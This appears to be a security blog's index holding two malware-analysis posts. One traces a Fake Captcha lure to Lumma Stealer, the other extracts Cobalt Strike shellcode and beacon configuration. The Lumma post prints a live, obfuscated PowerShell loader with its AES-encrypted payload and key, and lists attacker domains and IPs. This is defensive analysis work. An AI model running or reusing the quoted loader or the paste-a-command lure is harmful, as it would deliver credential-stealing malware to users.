[{"categories":null,"content":"Overview Since 2024, the ‘Fake Captcha’ technique has become very common. It is a social engineering attack that tricks the user into executing a command locally on their endpoint, after which the next stages of the malware are downloaded and executed. A lot of threat actors are using this technique to spread Lumma Stealer, which has been one of the most commonly used stealers! In this post, I am going to explore some of its stages and the deobfuscation of the payloads, focusing on JavaScript, PowerShell, and .NET. ","date":"2025-03-21","objectID":"/from_fake_captcha_to_lumma_stealer/:0:1","tags":null,"title":"From Fake captcha to Lumma Stealer: JavaScript, Powerhsell and .NET analysis","uri":"/from_fake_captcha_to_lumma_stealer/"},{"categories":null,"content":"Analysis The Fake Captcha Let’s start with the Fake Captcha. Users are commonly redirected to this technique by accessing insecure domains (like those free movie sites that redirect you to a different site with every click) and end up with an unusual captcha to solve. URL: objectstorage[.]ap-singapore-2[.]oraclecloud[.]com/n/ax4mqlu25efi/b/zordarruba/o/complete-this-step-to-continue[.]html Clicking on it, we receive some very suspicious instructions: press WINDOWS + R to open the Run command window, CTRL + V to paste something, and Enter to execute it. Our clipboard content is overwrited with something very suspicious. At first, there is a string meant to fool the user, but… At the start of the command, there is an mshta execution running a remote script. Let’s take a look at the remote script. At first, it plays an MP3 file of the music “Moonlight Dancer”, but let’s download it to take a closer look… Inspecting the file in a hex editor… and there it is a script that is part of an HTA file! HTA File Extracting the HTA file, we find that it contains a lot of very messy JavaScript with a LOT OF OBFUSCATION. Let’s try to find a suspicious function, like eval to make our analysis easier. And there’s an eval executing the aVRYN variable after some replace and decode of the payload. To summarize this function: The regular expression (..). works as follows: (..) captures two characters (potentially a hex value). . matches and ignores the next character (an obfuscation trick). The parseInt(p1, 16) converts the two-character hex string into a decimal number. String.fromCharCode(…) converts that decimal number into its corresponding ASCII character. Let’s copy the eval function and the aVRYN variable to another file and print the decoded aVRYN using the following code: var decoded = aVRYN.replace(/(..)./g, function(match, p1) { return String.fromCharCode(parseInt(p1, 16)); }); WScript.Echo(decoded); Now we have another decoding routine where each number in a is shifted by +664 and executed. Let’s copy it and again print out the result without the Run function. Powershell A PowerShell command with a decoding and decrypting routine, this time AES encryption was applied in the command. Let’s use CyberChef for this one, using the key 4F4C525A7878755676766C56676C6461, which can be found in the command. \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w h -ep Unrestricted -nop function mkMCv($UPAMeKP){-split($UPAMeKP -replace '..', '0x$\u0026 ')};$pzshDt=mkMCv('21FA56D1BE558F674DF2855593E966463F74F48B830841A1378B15A0613F562D05F9FB7FDF81833603B5A1F46E4C1C82982E4E4D9D338E2D472DFAFED1A6B3F413362B2219711B918D458F077DE1F42F72CF0660EF85D4F2A08D4672DC1AC3D7C2ECAFD5CC74AEC334027FDD7704B9BD2DAFFF93E1BBD07DD719120B52C47CBB559EAB3AAA6FB9827EE5F2143A3E5F51E14E1EDE146FA73B5EC1D71B26AA247307D0DFA7B5E8165CEA4244C31881F206E0ED652324AB7AAD601AC767F2A1C1F5D8318F1311E1427813CFD84865F7842B6E25C9FFDFBF42673569457149A6045B36743D582E63EB1E4FC248D1739B7963498F3D6CCE8FBD181E6BCCD0A479A33E15E3F28174431AF288E124DD6281B97D23E17FBF1A5697565F1ABBF4270386C554F8CEBC68CB347AF787208E343EF016377C3B3201176F2D62FCA754F6DCF5BE59FC4ADA1F5B60960CB628ADE2DDE5CE97FFF7EA959A5A858A31C7C8A770903EDE77998017A2898B2A2F7C4E5D9EA26551434DA605DCE9C50FAA497339721C2B385EB8DE61D4982E1F6A437BEDEC787BFA9701C9B1C799CBB8CE9A1A5CA4959F436525D824D1D365D32C753E291B740A7D4E553FCE77CAC48B152770543D9B4D04EE9FDDC9096BC854E0365BD49BC744161A71AF5A2108085615ADF6CB0268BBCB40C113C1E1F40C9AE066950C68D1C5908DC7B2E539C26E70FC6508DA0DF1B7FB9E897B3538BD456DDB4F9E8F922C5813C13873D189ADF3D76CCEA4D19EC0C5C9E5F1CCC85BA97879E2E47F3B7F757DB325AB40E936EC82447F3C069F262DD077CE453652706004FF499867AC11B8E7E57CE2E82F3BED6FDECCF3D56DD133848D27B1E2F2E53272F32C4811D31EB4460FD7528D04E201CB1EB51F258031E199A70ADE7FDDE1F018FFB26C919E7331C5');$qJrOwaqb=-join [char[]](([Security.Cryptography.Aes]::Create()).CreateDecryptor((mkMCv('4F4C525A7878755676766C56676C6461')),[byte[]]::new(16)).TransformFinalBlock($pzshDt,0,$pzshDt.Length","date":"2025-03-21","objectID":"/from_fake_captcha_to_lumma_stealer/:0:2","tags":null,"title":"From Fake captcha to Lumma Stealer: JavaScript, Powerhsell and .NET analysis","uri":"/from_fake_captcha_to_lumma_stealer/"},{"categories":null,"content":"IoCs jekin[.]shop perent4[.]ganderbrisklyonly[.]shop exploreth[.]shop v279792[.]hosted-by-vdsina[.]com puawprintm[.]bet begindecafer[.]world garagedrootz[.]top modelshiverd[.]icu arisechairedd[.]shop catterjur[.]run orangemyther[.]live fostinjec[.]today sterpickced[.]digital 46[.]8[.]232[.]106 ","date":"2025-03-21","objectID":"/from_fake_captcha_to_lumma_stealer/:0:3","tags":null,"title":"From Fake captcha to Lumma Stealer: JavaScript, Powerhsell and .NET analysis","uri":"/from_fake_captcha_to_lumma_stealer/"},{"categories":null,"content":"Concluding Thoughts Malwares with a lot of obfuscation like this can be very overwhelming, and it’s very important to focus on what stands out from the rest. A lot of analysis time can be saved this way! PowerShell, JavaScript, and .NET are extremely common to be heavily obfuscated, and this was what I wanted to focus on in this post Thank you for taking the time to read this! If you have any questions or suggestions, feel free to contact me. ","date":"2025-03-21","objectID":"/from_fake_captcha_to_lumma_stealer/:0:4","tags":null,"title":"From Fake captcha to Lumma Stealer: JavaScript, Powerhsell and .NET analysis","uri":"/from_fake_captcha_to_lumma_stealer/"},{"categories":null,"content":"Overview Cobalt Strike is a commercial red team and adversary simulation tool. It is widely used by security professionals to assess the security of networks and systems by simulating advanced persistent threats (APTs). As everything, due to its powerful capabilities, it has also been misused by cybercriminals and threat actors. In this post contains the analysis of two samples: Staged and Stageless payload. The extraction of the shellcode and the beacon for its configuration are quite similar in both payloads. ","date":"2025-03-03","objectID":"/cobalt_strike_shellcode_and_config_extraction/:0:1","tags":null,"title":"Cobalt Strike: Shellcode and Config extraction","uri":"/cobalt_strike_shellcode_and_config_extraction/"},{"categories":null,"content":"Analysis Staged Payload Lets start with the staged payload, the first thing that caught my attention in DiE was the lack of imports and some very suspicious APIs… Lets start setting some breakpoints in the observed APIs in x64dbg. These APIs like VirtualAlloc and VirtualProtect can be used either to self injection or remote injection. Note: Theres a bunch of APIs related to self injection or remote injection that we can set breakpoints like VirtualAllocEx, WriteProcessMemory, NtWriteVirtualMemory and others that can be used in the same context, for this analysis only VirtualAlloc will be enough. bp VirtualAlloc Running the debugger, it stop at the break point! Lets continue using the option “exec till return” Now in RAX we can see the memory location that is being allocated: 0x2000000 Right clicking the RAX value and following in dump the address. We can see that it is empty for now….. Lets monitor any content that will be written to this address using a hardware access breaking point in the first byte of the dump. Right Click on 0x00 on dump -\u003e Breakpoint -\u003e Hardware, Access -\u003e byte. After resuming the execution it stopped again and we can see in dump the first change in the allocated memory, In the instructions we can see that we are in a loop (For the shellcode be written in memory), lets add a break point where the jge points to: Resuming the execution again, in the dump we can see that now we have a lot of stuff written in the allocated space: First of all the classic first bytes of a shellcode “FC 48 83 E4”, after that an user agent and a IP address. Right clicking in the content of the dump we can use the disassembly function and see that the content became valid assembly instructions Now lets extract this shellcode! Right clicking again in the content of the dump and use “Follow in Memory Map” -\u003e selecting the right region -\u003e Dump Memory to File And like that we can extract the shellcode! With the shellcode in hand we can emulate the execution and see some of its behavior. I am using speakeasy to emulate the execution. speakeasy -r -a AMD64 -t SHELLCODE.bin With the result it is possible to see the shellcode opening the connection with the C2 IP address, downloading the content and allocating again some space in memory for the next stage. And if resume the execution again in the debugger…..the ip don’t respond to any connections anymore so no more stages = no config extraction for this sample. Stageless Payload Lets analyze the stageless payload, so instead of using a shellcode to download and execute the next stage, this sample has everything that it needs to execute and establish the C2 connection after loading in memory the beacon. The process is the same, so lets just extract the binary after being allocated in memory and dump to a file like previously done. In the dump it is possible to see the magic bytes of a PE and strings related to the beacon. After dumping to a file, using the tool CobaltStrikeParser created by SentinelOne team to extract the configs. python parse_beacon_config.py BEACON.bin Success! ","date":"2025-03-03","objectID":"/cobalt_strike_shellcode_and_config_extraction/:0:2","tags":null,"title":"Cobalt Strike: Shellcode and Config extraction","uri":"/cobalt_strike_shellcode_and_config_extraction/"},{"categories":null,"content":"IoCs Staged payload: b35e14dcab4d565e195937c12f10306eae56ac9e72245775e0b467c718c2e86c IP: 20[.]74[.]209[.]192 ","date":"2025-03-03","objectID":"/cobalt_strike_shellcode_and_config_extraction/:0:3","tags":null,"title":"Cobalt Strike: Shellcode and Config extraction","uri":"/cobalt_strike_shellcode_and_config_extraction/"},{"categories":null,"content":"Concluding Thoughts The cobalt strike beacons has numerous techniques that could be explored here and in the wild it is common to see the droppers being protected by packers, crypters and protectors adding more complexity for the analysis, but for this post I’ll conclude the analysis of these samples here. Thank you for taking the time to read this! Any questions or suggestions, feel free to contact me. Until next post :D ","date":"2025-03-03","objectID":"/cobalt_strike_shellcode_and_config_extraction/:0:4","tags":null,"title":"Cobalt Strike: Shellcode and Config extraction","uri":"/cobalt_strike_shellcode_and_config_extraction/"}]